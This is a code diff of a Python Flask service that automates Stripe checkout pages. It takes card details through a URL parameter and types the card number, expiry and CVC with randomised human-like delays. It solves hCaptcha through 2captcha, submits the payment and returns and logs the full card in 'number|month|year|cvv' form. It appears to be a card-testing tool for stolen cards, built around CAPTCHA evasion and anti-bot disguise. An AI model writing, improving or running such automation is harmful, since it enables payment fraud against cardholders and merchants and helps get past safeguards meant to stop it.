+                for attempt in range(2):
+                    if all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]) or shared_state.captcha_token_found:
+                        break
+                    
+                    frames_to_check = [page] + stripe_frames
+                    
+                    for frame_or_page in frames_to_check:
+                        if shared_state.captcha_token_found:
+                            break
+                        try:
+                            # Card number
+                            if not filled_status["card"]:
+                                card_selectors = [
+                                    'input[placeholder*="1234" i]',
+                                    'input[placeholder*="card" i]',
+                                    'input[name*="card" i]',
+                                    'input[autocomplete="cc-number"]',
+                                    'input[data-elements-stable-field-name="cardNumber"]',
+                                    '#cardNumber'
+                                ]
+                                for selector in card_selectors:
+                                    try:
+                                        element = await frame_or_page.query_selector(selector)
+                                        if element and await element.is_visible():
+                                            await element.scroll_into_view_if_needed()
+                                            await element.click()
+                                            await element.fill("")
+                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
+                                            for digit in card['number']:
+                                                await element.type(digit, delay=typing_delay)
+                                            filled_status["card"] = True
+                                            break
+                                    except:
+                                        continue
+                            
+                            # Expiry
+                            if not filled_status["expiry"]:
+                                expiry_selectors = [
+                                    'input[placeholder*="mm" i]',
+                                    'input[placeholder*="exp" i]',
+                                    'input[name*="exp" i]',
+                                    'input[autocomplete="cc-exp"]',
+                                    'input[data-elements-stable-field-name="cardExpiry"]',
+                                    '#cardExpiry'
+                                ]
+                                for selector in expiry_selectors:
+                                    try:
+                                        element = await frame_or_page.query_selector(selector)
+                                        if element and await element.is_visible():
+                                            await element.scroll_into_view_if_needed()
+                                            await element.click()
+                                            await element.fill("")
+                                            exp_string = f"{card['month']}/{card['year'][-2:]}"
+                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
+                                            for char in exp_string:
+                                                await element.type(char, delay=typing_delay)
+                                            filled_status["expiry"] = True
+                                            break
+                                    except:
+                                        continue
+                            
+                            # CVC
+                            if not filled_status["cvc"]:
+                                cvc_selectors = [
+                                    'input[placeholder*="cvc" i]',
+                                    'input[placeholder*="cvv" i]',
+                                    'input[placeholder*="security" i]',
+                                    'input[name*="cvc" i]',
+                                    'input[name*="cvv" i]',
+                                    'input[autocomplete="cc-csc"]',
+                                    'input[data-elements-stable-field-name="cardCvc"]',
+                                    '#cardCvc'
+                                ]
+                                for selector in cvc_selectors:
+                                    try:
+                                        element = await frame_or_page.query_selector(selector)
+                                        if element and await element.is_visible():
+                                            await element.scroll_into_view_if_needed()
+                                            await element.click()
+                                            await element.fill("")
+                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
+                                            for digit in card['cvv']:
+                                                await element.type(digit, delay=typing_delay)
+                                            filled_status["cvc"] = True
+                                            break
+                                    except:
+                                        continue
+                        except Exception as e:
+                            continue
+                    
+                    if not all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
+                        await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1000)
+                
+                # Wait for validation
+                await safe_wait(page, 1500 if CONFIG['FAST_MODE'] else 3000)
+                await wait_for_network_idle(page, 3000)
+                
+                # Check for captcha again
+                has_captcha_after = await captcha_handler.detect_hcaptcha(page)
+                if has_captcha_after and not stripe_result["captcha_solved"]:
+                    sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
+                    
+                    if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
+                        token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
+                        if token:
+                            await captcha_handler.inject_captcha_token(page, token)
+                            stripe_result["captcha_solved"] = True
+                            await safe_wait(page, 1000)
+                
+                # Check if token was found
+                if shared_state.captcha_token_found:
+                    print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
+                    print(f"Token: {shared_state.captcha_token}")
+                    return {
+                        "success": True,
+                        "action": "CAPTCHA_TOKEN_CAPTURED",
+                        "generated_pass_UUID": shared_state.captcha_token,
+                        "all_api_calls": stripe_result['raw_api_calls'],
+                        "network_stats": {
+                            "total_requests": stripe_result['network_requests'],
+                            "api_calls": len(stripe_result['raw_api_calls']),
+                            "errors": stripe_result['network_errors']
+                        }
+                    }
+                
+                # Submit payment
+                submit_selectors = [
+                    'button[type="submit"]:visible',
+                    'button:has-text("pay"):visible',
+                    'button:has-text("submit"):visible',
+                    'button:has-text("complete"):visible',
+                    'button:has-text("confirm"):visible',
+                    'button:has-text("place order"):visible',
+                    'button:has-text("checkout"):visible',
+                    'button.btn-primary:visible',
+                    'button.submit-button:visible',
+                    'input[type="submit"]:visible'
+                ]
+                
+                for selector in submit_selectors:
+                    if shared_state.captcha_token_found:
+                        break
+                    try:
+                        btn = page.locator(selector).first
+                        if await btn.count() > 0:
+                            is_disabled = await btn.get_attribute('disabled')
+                            if is_disabled is None or is_disabled == 'false':
+                                await btn.scroll_into_view_if_needed()
+                                await btn.click()
+                                payment_submitted = True
+                                break
+                    except:
+                        continue
+                
+                if not payment_submitted and not shared_state.captcha_token_found:
+                    await page.keyboard.press('Enter')
+                    payment_submitted = True
+                
+                # Wait for payment processing
+                await safe_wait(page, 10000 if CONFIG['FAST_MODE'] else 15000)
+                await wait_for_network_idle(page, 5000)
+                
+                # Monitor for response
+                start_time = time.time()
+                max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
+                
+                while time.time() - start_time < max_wait and not shared_state.captcha_token_found:
+                    # Keep alive
+                    if int(time.time() - start_time) % 5 == 0 and int(time.time() - start_time) > 0:
+                        try:
+                            await page.evaluate('1')
+                        except:
+                            break
+                    
+                    await asyncio.sleep(0.5)
+
+            except CaptchaTokenFound:
+                pass  # Token was found, exit gracefully
+
+            # Final output generation
+            if shared_state.captcha_token_found:
+                print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
+                print(f"Token: {shared_state.captcha_token}")
+                return {
+                    "success": True,
+                    "action": "CAPTCHA_TOKEN_CAPTURED",
+                    "generated_pass_UUID": shared_state.captcha_token,
+                    "all_api_calls": stripe_result['raw_api_calls'],
+                    "network_stats": {
+                        "total_requests": stripe_result['network_requests'],
+                        "api_calls": len(stripe_result['raw_api_calls']),
+                        "errors": stripe_result['network_errors']
+                    }
                 }
+            
+            # Standard flow completion
+            requests_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'request']
+            responses_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'response']
+            
+            base_response = {
+                "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
+                "captcha_solved": stripe_result.get("captcha_solved"),
+                "network_stats": {
+                    "total_requests": stripe_result['network_requests'],
+                    "api_calls": len(stripe_result['raw_api_calls']),
+                    "requests_with_body": len(requests_only),
+                    "responses": len(responses_only),
+                    "errors": stripe_result['network_errors']
+                },
+                "all_api_calls": stripe_result['raw_api_calls']
             }
             
-            return result
-            
+            if stripe_result.get("payment_confirmed"):
+                return {
+                    **base_response,
+                    "success": True,
+                    "message": "Payment successful (No Captcha token found in API response)",
+                }
+            else:
+                return {
+                    **base_response,
+                    "success": False,
+                    "message": "Process complete, no token found. Check raw calls for status.",
+                    "error": stripe_result.get("error", "No error detected during runtime.")
+                }
+                
         except Exception as e:
-            print(f"[ERROR] {e}")
-            import traceback
+            # Check for token again
+            if shared_state.captcha_token_found:
+                return {
+                    "success": True,
+                    "action": "CAPTCHA_TOKEN_CAPTURED",
+                    "generated_pass_UUID": shared_state.captcha_token,
+                    "all_api_calls": stripe_result['raw_api_calls'],
+                    "network_stats": {
+                        "total_requests": stripe_result['network_requests'],
+                        "api_calls": len(stripe_result['raw_api_calls']),
+                        "errors": stripe_result['network_errors']
+                    }
+                }
+            
             return {
                 "success": False,
-                "error": str(e),
-                "traceback": traceback.format_exc(),
-                "partial_data": {
-                    "requests": capture.all_requests,
-                    "responses": capture.all_responses,
-                    "summary": capture.get_summary()
+                "error": f"Automation failed: {str(e)}",
+                "captcha_solved": stripe_result.get("captcha_solved", False),
+                "all_api_calls": stripe_result.get("raw_api_calls", []),
+                "network_stats": {
+                    "total_requests": stripe_result.get('network_requests', 0),
+                    "api_calls": len(stripe_result.get('raw_api_calls', [])),
+                    "errors": stripe_result.get('network_errors', 0)
                 }
             }
             
         finally:
-            # Cleanup
             try:
                 if page:
                     await page.close()
@@ -417,196 +1015,73 @@ async def extract_hcaptcha_data(site_key: str, host: str = "checkout.stripe.com"
                     await context.close()
                 if browser:
                     await browser.close()
-                print("[CLEANUP] ✅ Browser closed")
-            except Exception as e:
-                print(f"[CLEANUP] Error: {e}")
-
-
-def decode_jwt_token(token: str) -> Dict:
-    """Decode JWT token (generated_pass_UUID)"""
-    try:
-        # Remove P1_ prefix if present
-        if token.startswith('P1_'):
-            jwt_token = token[3:]
-            prefix = 'P1'
-        else:
-            jwt_token = token
-            prefix = None
-        
-        parts = jwt_token.split('.')
-        if len(parts) < 2:
-            return {"error": "Invalid JWT format"}
-        
-        # Decode header
-        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
-        header_decoded = base64.urlsafe_b64decode(header_b64)
-        header_json = json.loads(header_decoded.decode())
-        
-        # Decode payload
-        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
-        payload_decoded = base64.urlsafe_b64decode(payload_b64)
-        payload_json = json.loads(payload_decoded.decode())
-        
-        # Format expiration if present
-        if 'exp' in payload_json:
-            try:
-                exp_dt = datetime.fromtimestamp(payload_json['exp'])
-                payload_json['exp_formatted'] = exp_dt.isoformat()
             except:
                 pass
-        
-        result = {
-            "prefix": prefix,
-            "header": header_json,
-            "payload": payload_json
-        }
-        
-        if len(parts) >= 3:
-            result["signature"] = parts[2][:50] + "..." if len(parts[2]) > 50 else parts[2]
-        
-        return result
-        
-    except Exception as e:
-        return {"error": str(e)}
 
-
-# Flask Routes
-
-@app.route('/hrk/captcha', methods=['GET'])
-def hcaptcha_endpoint():
-    """
-    Extract hCaptcha data including generated_pass_UUID
+@app.route('/hrkXstripe', methods=['GET'])
+def stripe_endpoint():
+    can_proceed, wait_time = rate_limit_check()
+    if not can_proceed:
+        return jsonify({"error": "Rate limit exceeded", "retry_after": f"{wait_time:.1f}s"}), 429
     
-    Query Parameters:
-        site_key (required): hCaptcha site key
-        host (optional): Host domain (default: checkout.stripe.com)
-        timeout (optional): Timeout in seconds (default: 30)
-        pretty (optional): Pretty print JSON (true/false)
+    url = request.args.get('url')
+    cc = request.args.get('cc')
+    email = request.args.get('email')
     
-    Example:
-        /hrk/captcha?site_key=ec637546-e9b8-447a-ab81-b5fb6d228ab8&pretty=true
-    """
+    print(f"\n{'='*80}")
+    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[URL] {url[:100]}...")
+    print(f"[CC] {cc}")
+    print('='*80)
     
-    site_key = request.args.get('site_key')
-    host = request.args.get('host', 'checkout.stripe.com')
-    timeout = int(request.args.get('timeout', 30))
-    pretty = request.args.get('pretty', 'false').lower() == 'true'
+    if not url or not cc:
+        return jsonify({"error": "Missing parameters: url and cc"}), 400
     
-    if not site_key:
-        return jsonify({
-            "success": False,
-            "error": "Missing required parameter: site_key",
-            "usage": {
-                "endpoint": "/hrk/captcha",
-                "required": ["site_key"],
-                "optional": ["host", "timeout", "pretty"],
-                "example": "/hrk/captcha?site_key=ec637546-e9b8-447a-ab81-b5fb6d228ab8&pretty=true"
-            }
-        }), 400
-    
-    if not CONFIG["BROWSERLESS_API_KEY"] and not CONFIG["RUN_LOCAL"]:
-        return jsonify({
-            "success": False,
-            "error": "Browserless.io API key not configured",
-            "setup": {
-                "get_key": "https://www.browserless.io/",
-                "set_env": "BROWSERLESS_API_KEY=your_key",
-                "or_local": "RUN_LOCAL=true"
-            }
-        }), 400
-    
-    # Run async function
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
     try:
-        result = loop.run_until_complete(extract_hcaptcha_data(site_key, host, timeout))
-        
-        if pretty:
-            return app.response_class(
-                response=json.dumps(result, indent=2, ensure_ascii=False),
-                status=200,
-                mimetype='application/json'
-            )
+        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
+        if result.get('action') == 'CAPTCHA_TOKEN_CAPTURED':
+            print(f"[RESULT] CAPTCHA Token Captured and Outputted.")
         else:
-            return jsonify(result)
+            print(f"[RESULT] {'✓ SUCCESS' if result.get('success') else '✗ FAILED'}")
+        
+        # Ensure the token is printed as requested
+        if result.get('generated_pass_UUID'):
+            print(f"Generated Token: {result['generated_pass_UUID']}")
             
+        return jsonify(result), 200 if result.get('success') else 400
     except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": str(e)
-        }), 500
+        print(f"[SERVER ERROR] {e}")
+        return jsonify({"error": str(e)}), 500
     finally:
         loop.close()
 
-
-@app.route('/hrk/health', methods=['GET'])
-def health_check():
-    """Health check endpoint"""
+@app.route('/status', methods=['GET'])
+def status_endpoint():
     return jsonify({
-        "status": "healthy",
-        "service": "hCaptcha Extraction API",
-        "version": "1.0",
-        "browserless": {
-            "configured": bool(CONFIG["BROWSERLESS_API_KEY"]),
-            "endpoint": "wss://production-sfo.browserless.io"
+        "status": "online",
+        "version": "5.1-hcaptcha-prioritizer-fixed",
+        "features": {
+            "hcaptcha": True,
+            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
+            "auto_retry": True,
+            "universal_api_capture": True,
+            "request_body_logging": CONFIG.get("LOG_REQUEST_BODIES", False),
+            "fast_mode": CONFIG.get("FAST_MODE", False),
+            "prioritize_captcha_token": True
         },
-        "local_mode": CONFIG["RUN_LOCAL"],
         "timestamp": datetime.now().isoformat()
     })
 
-
-@app.route('/', methods=['GET'])
-def index():
-    """API documentation"""
-    return jsonify({
-        "service": "hCaptcha Extraction API",
-        "version": "1.0",
-        "endpoints": {
-            "/": "API documentation",
-            "/hrk/captcha": "Extract hCaptcha data",
-            "/hrk/health": "Health check"
-        },
-        "usage": {
-            "endpoint": "/hrk/captcha",
-            "method": "GET",
-            "parameters": {
-                "site_key": "hCaptcha site key (required)",
-                "host": "Host domain (optional, default: checkout.stripe.com)",
-                "timeout": "Timeout in seconds (optional, default: 30)",
-                "pretty": "Pretty print JSON (optional, true/false)"
-            },
-            "example": "/hrk/captcha?site_key=ec637546-e9b8-447a-ab81-b5fb6d228ab8&pretty=true"
-        },
-        "response_fields": {
-            "success": "Boolean indicating success",
-            "generated_pass_uuid": {
-                "token": "The P1_xxx JWT token",
-                "decoded": "Decoded JWT payload"
-            },
-            "hsw_challenge": "The HSW challenge data",
-            "network": {
-                "requests": "All HTTP requests",
-                "responses": "All HTTP responses with bodies"
-            },
-            "summary": "Summary statistics"
-        }
-    })
-
-
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    
-    print("\n" + "="*70)
-    print("🚀 hCaptcha Extraction API")
-    print("="*70)
-    print(f"Port: {port}")
-    print(f"Browserless: {'✅ Configured' if CONFIG['BROWSERLESS_API_KEY'] else '❌ Not configured'}")
-    print(f"Mode: {'Local' if CONFIG['RUN_LOCAL'] else 'Browserless.io'}")
-    print(f"Endpoint: wss://production-sfo.browserless.io")
-    print("="*70)
-    print("\n📖 Usage:")
-    print(f"  http://localhost:{port}/hrk/captcha?site_key=YOUR_SITE_KEY&pretty=true")
-    print("\n" + "="*70 + "\n")
-    
+    port = int(os.environ.get('PORT', 5001))
+    print("="*80)
+    print("[SERVER] Stripe Automation v5.1 - HCaptcha Prioritizer (Fixed)")
+    print(f"[PORT] {port}")
+    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
+    print(f"[MODE] {'FAST' if CONFIG.get('FAST_MODE') else 'NORMAL'}")
+    print(f"[REQUEST BODIES] {'CAPTURING' if CONFIG.get('LOG_REQUEST_BODIES') else 'DISABLED'}")
+    print("="*80)
     app.run(host='0.0.0.0', port=port, debug=False)
